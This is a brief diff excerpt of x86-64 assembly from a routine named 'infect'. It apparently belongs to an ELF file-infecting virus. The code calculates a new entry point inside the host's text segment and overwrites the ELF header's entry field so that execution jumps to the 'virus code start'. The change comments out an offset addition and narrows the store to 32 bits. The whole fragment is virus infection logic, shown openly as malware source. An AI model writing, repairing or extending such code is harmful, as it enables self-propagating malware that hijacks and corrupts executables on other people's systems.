@@ -754,8 +754,8 @@ infect:
 				mov r10, [r13 + r12 + elf_phdr.p_vaddr] 	;entry virtual addr (evaddr) = phdr->p_vaddr + phdr->p_filesz
 				add r10, [r13 + r12 + elf_phdr.p_filesz]
 				mov qword [evaddr], r10				;save evaddr
-				add qword r10, [ventry]				;new entry point of infected file = evaddr + ventry
-				mov [r13 + elf_ehdr.e_entry], r10	; update ELF header entry point to point to virus code start
+				;add dword r10d, [ventry]				;new entry point of infected file = evaddr + ventry
+				mov dword [r13 + elf_ehdr.e_entry], r10d	; update ELF header entry point to point to virus code start
 				mov r10, [r13 + r12 + elf_phdr.p_offset] 
 				mov dword [hosttext_start], r10d
 				add r10, [r13 + r12 + elf_phdr.p_filesz]				
